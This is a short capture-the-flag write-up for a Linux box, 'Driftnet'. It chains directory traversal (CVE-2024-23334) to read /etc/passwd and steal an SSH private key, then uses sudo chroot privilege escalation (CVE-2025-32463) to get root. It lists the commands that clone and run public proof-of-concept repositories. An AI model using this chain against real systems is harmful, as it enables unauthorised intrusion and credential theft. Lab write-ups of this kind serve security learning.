# Driftnet
CTF writeup: rooting a Linux box via CVE-2024-23334 (directory traversal) and CVE-2025-32463 (sudo privilege escalation)




**Category:** Linux | **CVEs:** CVE-2024-23334 (Directory Traversal), CVE-2025-32463 (sudo chroot priv-esc)

## Recon
- `ping` to confirm host is alive
- Full port scan: `nmap -p-`
- Service/version detection on open ports (22, 80, 443): `nmap -A`

## Initial Foothold — CVE-2024-23334 (Directory Traversal)
The web service failed to sanitize `../` sequences in its static file handler, allowing arbitrary file reads outside the intended `/assets/` directory.

```bash
git clone https://github.com/z3rObyte/CVE-2024-23334-PoC
cd CVE-2024-23334-PoC
python3 -m venv .env
source .env/bin/activate
pip3 install -r requirements.txt
python3 server.py
```

Used the PoC to read `/etc/passwd` for user enumeration, then located and exfiltrated the `deploy` user's `id_ed25519` SSH private key.

```bash
ssh -i key.txt deploy@<target>
```

## Privilege Escalation — CVE-2025-32463 (sudo -R)
`sudo -V` revealed a vulnerable sudo version. The `-R` (chroot) flag can be tricked into treating an attacker-controlled directory as `/`, letting a low-privileged user escalate to root.

```bash
git clone https://github.com/MohamedKarrab/CVE-2025-32463.git
cd CVE-2025-32463
./get_root.sh
```

Transferred the exploit to the target via `scp`, executed it, got root.

## Takeaways
- Directory traversal depth depends on the web root's actual filesystem depth — tested `../` counts incrementally until reaching `/`.
- Always run `sudo -V` on a fresh foothold — version-specific CVEs are a fast path to root.
